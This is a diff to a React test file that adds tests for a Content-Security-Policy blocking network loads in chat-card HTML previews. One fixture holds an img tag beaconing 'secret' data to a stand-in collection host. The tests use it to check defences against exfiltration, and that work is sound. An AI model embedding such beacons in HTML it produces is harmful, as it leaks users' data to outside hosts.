@@ -22,7 +22,7 @@ import {
 } from "@agenteschat/client/lib/drive";
 import { act, cleanup, fireEvent, render, within } from "@testing-library/react";
 import { fileSaver } from "@/components/artifacts/ArtifactViewer";
-import { HTML_SANDBOX, withShim } from "@/components/artifacts/HtmlFrame";
+import { HTML_SANDBOX, HtmlFrame, PREVIEW_CSP, withShim } from "@/components/artifacts/HtmlFrame";
 import { setMermaidRenderer } from "@/components/artifacts/Mermaid";
 import { Markdown, parseMarkdown } from "@/lib/markdown";
 import { ATLAS_ID, createFakeApi, ENG_ID, ORG_ID, seedState } from "./fake-api";
@@ -916,5 +916,41 @@ describe("html shim", () => {
     expect(doctype.startsWith("<!DOCTYPE html><script>")).toBe(true);
     expect(withShim("<h1>a</h1>").startsWith("<script>")).toBe(true);
     expect(withShim("<header>a</header>").startsWith("<script>")).toBe(true);
+  });
+
+  test("a chat card's preview may load nothing from the network, before anything of the page; the opened page may", () => {
+    const hostile = `<!doctype html><img src="https://collect.example.net/?d=secret"><html><head><title>x</title></head></html>`;
+    const preview = withShim(hostile, true);
+    expect(preview.startsWith(`<!doctype html>${PREVIEW_CSP}`)).toBe(true);
+    expect(preview.indexOf(PREVIEW_CSP)).toBeLessThan(preview.indexOf("<img"));
+    expect(preview.indexOf(PREVIEW_CSP)).toBeLessThan(preview.indexOf("<script>"));
+    expect(PREVIEW_CSP).toContain("connect-src 'none'");
+    expect(PREVIEW_CSP).toContain("img-src data: blob:;");
+    expect(withShim("<h1>a</h1>", true).startsWith(PREVIEW_CSP)).toBe(true);
+    expect(withShim(hostile)).not.toContain("Content-Security-Policy");
+  });
+
+  test("the card's frame loads the page with the policy, the opened one without", async () => {
+    const pages: Blob[] = [];
+    const create = URL.createObjectURL;
+    URL.createObjectURL = (b: Blob | MediaSource) => {
+      pages.push(b as Blob);
+      return `blob:page-${pages.length}`;
+    };
+    try {
+      const html = "<!doctype html><html><head></head><body>x</body></html>";
+      render(
+        <>
+          <HtmlFrame html={html} title="card" thumbnail />
+          <HtmlFrame html={html} title="opened" />
+        </>,
+      );
+      await settle(1);
+      const [card, opened] = await Promise.all(pages.slice(0, 2).map((b) => b.text()));
+      expect(card?.startsWith(`<!doctype html>${PREVIEW_CSP}`)).toBe(true);
+      expect(opened).not.toContain("Content-Security-Policy");
+    } finally {
+      URL.createObjectURL = create;
+    }
   });
 });
